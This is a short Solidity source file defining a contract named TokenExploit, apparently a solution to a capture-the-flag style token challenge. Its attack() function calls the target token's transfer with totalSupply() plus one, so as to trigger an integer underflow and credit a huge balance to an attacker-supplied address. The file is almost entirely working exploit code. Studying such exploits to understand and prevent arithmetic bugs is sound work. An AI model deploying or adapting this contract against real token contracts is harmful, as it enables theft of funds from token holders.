pragma solidity ^0.8.4;

interface TokenInterface{
	function transfer(address _to, uint _value) external returns (bool);
	function balanceOf(address _owner) external view returns (uint balance);
	function totalSupply() external view returns(uint);
}

contract TokenExploit {

	// Variables & Declarations
	address tokenAddr;

	// Constructor
	constructor(address _addr) public {
		tokenAddr = _addr;
	}

	// Methods
	function attack(address _attackerAddr) public returns(bool) {
		// Access to Target
		TokenInterface ti = TokenInterface(tokenAddr);

		// Calculate the Underflow Amount (i.e. Amount that Causes Underflow)
		uint totalAmount = ti.totalSupply();
		uint underflowAmount = totalAmount + 1;

		// Underflow!!
		return ti.transfer(_attackerAddr, underflowAmount);
	}
}